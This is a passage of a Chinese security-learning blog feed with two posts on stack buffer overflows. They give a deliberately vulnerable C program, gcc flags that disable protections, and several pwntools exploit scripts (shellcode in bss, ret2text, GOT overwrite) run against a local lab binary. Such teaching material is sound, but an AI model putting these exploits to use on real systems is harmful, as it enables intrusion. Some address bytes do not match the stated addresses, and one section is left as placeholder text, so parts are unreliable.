自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c</code></pre><p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出（一）</title>
      <link href="/2019/03/25/zhan-yi-chu-yi/"/>
      <url>/2019/03/25/zhan-yi-chu-yi/</url>
      
        <content type="html"><![CDATA[<h5 id="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"><a href="#开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。" class="headerlink" title="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"></a>开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。</h5><a id="more"></a>        <h2 id="一、栈溢出的概念"><a href="#一、栈溢出的概念" class="headerlink" title="一、栈溢出的概念"></a>一、栈溢出的概念</h2><p>　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都要分配一些内存空间，通常称这些空间为缓冲区，（操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中。）当我们定义的数据所需要占用的内存超过了栈的大小时，就会发生栈溢出。   </p><p>　　举个例子，比如我们定义一个C程序的函数：    </p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>    　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>　　当我们定义了一个32字节的字符串s时，内存中会申请一个32字节的空间来保存这个字符串的数据，但<code>read</code>函数的读取字长参数是128[<code>read</code>函数的三个参数分别是<code>fd</code>（0标准输入，1标准输出），读取起始地址，读取字长]，明显超过了数组的字节长度，32位以后的数据就会“涌出”预留空间，缓冲区内其他部分“进发”，这就是栈溢出。　　　　　　</p><h2 id="二、简单的利用"><a href="#二、简单的利用" class="headerlink" title="二、简单的利用　"></a>二、简单的利用　</h2><p>　　任何语言的代码最后都可以转成汇编语言这种“通用语言”。如果用汇编语言去看一个程序的代码，在一个函数调用了另一段函数且运行结束后，会出现<code>ret</code>指令，<code>ret</code>指令会返回到调用者函数（<code>ret</code>指令做的事是：把当前栈顶元素写入<code>rip</code>寄存器），即执行调用者函数Ａ→调用执行某函数Ｂ→Ｂ结束后ret跳转继续执行调用者函数A。如果能够修改存储的ret指令操作的地址值，那就可以操纵这个函数执行完毕后跳转的位置，再如果，我们能将这个地址值修改成一段恶意代码的地址，那么它将会跳转到这段恶意代码的地址上并执行它（当然前提是栈是可执行的，如果开启了NX保护可能就不行了）。</p><p>　　举个简单的例子，有如下Ｃ语言代码：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>　　　　　</span><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　　<span class="token punctuation">{</span>　　<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// "/bin/sh"可执行shell脚本，即执行系统命令</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　<span class="token punctuation">{</span>　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//从数组s起始地址开始向后写入128字节　　　　</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>　　<span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>　　按照之前的说法，我们需要知道 ①数组<code>s</code>起始地址 ②<code>ret</code>指令对应地址 ③两者之间的差（用于填充无关字节使其后的字节处于溢出状态）④<code>shell()</code>函数的地址       </p><p>　　数组<code>s</code>的起始地址可以通过<code>gdb</code>工具调试得来，找到运行<code>read</code>函数的地址即可；<code>ret</code>指令地址基本类似；两者之间的差就是十六进制的加减法，很好算。首先要用<code>gcc</code>工具将c代码编译成二进制可执行文件，然后再通过<code>gdb</code>工具调试。注意，指令应为：<code>gcc xxx.c -o 自定义的可执行文件名 -no-pie</code>。<code>pie</code>是程序随机化保护，不关掉的话每次运行变量函数的地址都不一样，难以攻击。      </p><p>　　关于gdb的使用过程：       </p><pre class=" language-bash"><code class="language-bash">假设可执行文件名为vul（后缀名正常情况下为.o，在此不重要）gdb vulb vul       <span class="token comment" spellcheck="true">#在vul()函数下断点，（b后按tab会有可选项）可将可执行文件拖入IDA中查看伪代码</span>run         <span class="token comment" spellcheck="true">#跑起来</span>n           <span class="token comment" spellcheck="true">#即next，向下执行，直到执行到read，记下当前地址（0x7fffffffe090）</span>n           <span class="token comment" spellcheck="true">#向下执行，直到执行到ret，当前地址（0x7fffffffe0b8）   </span></code></pre><p>　　<img src="/images/2019-03-19-栈溢出（一）_1.png" alt="这是一个暗搓搓的read示意图">　　　　　　　　<br>  　　　　　　　　　　　　<br>　　<img src="/images/2019-03-19-栈溢出（一）_2.png" alt="这是一个暗搓搓的ret示意图">　　　　　　　　　</p><p>　　接下来就是作差，可得是40，即是两者之间相差40字节，从<code>s</code>处用40个字节可以填充中间数据段，再写就可以溢出，影响<code>ret</code>，影响函数执行后的跳转位置。接下来查看我们“恶意代码”的位置，并将这段地址填入<code>ret</code>中。<code>system(&quot;/bin/shell&quot;);</code>这一段代码是可执行文件里自带的，这样比较简单，比较好找，可以拖入IDA中查看，找到<code>_system</code>，按空格即可找到对应位置，我们的是<code>08048310</code>。因为linux是小端存储，所以将这个地址倒向填入，即<code>\x10\x83\x04\x03\x00\x00\x00\x00</code></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>              <span class="token comment" spellcheck="true">#pwn即pwntools，一个很好用的库</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#启动程序，形成进程</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">'\x10\x83\x04\x03\x00\x00\x00\x00'</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#在这卡一下，使程序不会运行的太快以至于？？？</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">#弹回一个交互式shell</span></code></pre><p>即可。<br>P.S.　<code>raw_input()</code>　是为了给程序刹个车，不让它走的太快，因为……因为啥我忘了……</p><h2 id="三、另一种办法"><a href="#三、另一种办法" class="headerlink" title="三、另一种办法"></a>三、另一种办法</h2><p>　　还有一种办法是通过延迟绑定技术实现，延迟绑定技术是指#####它的优势是：####### GOT表项的地址对应真实数据，PLT表项的地址对应的是在GOT中的地址。   </p><p>　　攻击脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">44</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x00\x00\x00'</span> <span class="token operator">+</span> <span class="token string">'\x0c\xA0\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x04\x00\x00\x00'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x3B\x84\x04\x08'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>　　<img src="/images/2019-03-19-栈溢出（一）_3.jpg" alt="这是一个稚嫩又潦草的手绘栈图示">      </p><h3 id="3-1-详细阐述一下payload的每个部分和工作运行的细节"><a href="#3-1-详细阐述一下payload的每个部分和工作运行的细节" class="headerlink" title="3.1 详细阐述一下payload的每个部分和工作运行的细节"></a>3.1 详细阐述一下payload的每个部分和工作运行的细节</h3><p>（payload由44个a和五个小字符串拼接而成，将五个小字符串标记序号12345，将倒数第二行的标记为6）<br>44个a：老样子，还是填充无关字节到ret<br>字符串1，2：<code>read_plt</code><br>字符串3，4，5：代表read的三个参数(0, read_got, 4)<br>字符串6：shell的地址<br><strong>关于如何查看这几个地址，IDA中按空格键即可。</strong>       </p><h3 id="3-2-read函数总共运行三次"><a href="#3-2-read函数总共运行三次" class="headerlink" title="3.2 read函数总共运行三次"></a>3.2 read函数总共运行三次</h3><p>第一次：通过read函数填充字符串起始位置到ret之间的空间，通过溢出将payload整个部署到ret以及后面的部分上，相当于整体布局的作用。<br>第二次：上一个read执行完，开始ret的时候出现异常，因为此时ret所指向的返回地址已经被修改成了<code>read_plt</code>。跳转后执行read，三个参数是(0, read_got, 4)，4的意思是地址只需要4个字节。此时read执行尚未完毕，处于待输入状态，<code>io.send(&#39;\x3B\x84\x04\x08&#39;)</code>将shell的地址输入进去，即：将<code>read_got</code>修改成了shell的地址。<code>read_got→shell</code><br>第三次：上一个read执行完，下面还是一个<code>read_plt</code>，按理说看见这个应该跳到<code>read_got</code>（<code>read_plt</code>指向<code>read_got</code>），但这时的<code>read_got</code>已经在上一步中修改成了<code>shell</code>的地址，即：实际上ret跳转是跳到了<code>shell</code>上。<code>read_plt→read_got→shell</code><br>（第一个ret跳转的read参数直接取下面的三个值了，先跳过了第二个read，执行完才继续执行第二个read，取参数整体似乎不是按照顺序来的，到底为什么尚未可知，学一学编程或者基础知识再说吧，要不然耽误写脚本）      </p><h1 id="3-x-这样就成功了！！！-3」∠"><a href="#3-x-这样就成功了！！！-3」∠" class="headerlink" title="3.x 这样就成功了！！！(:3」∠)"></a>3.x 这样就成功了！！！<em>(:3」∠)</em></h1>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
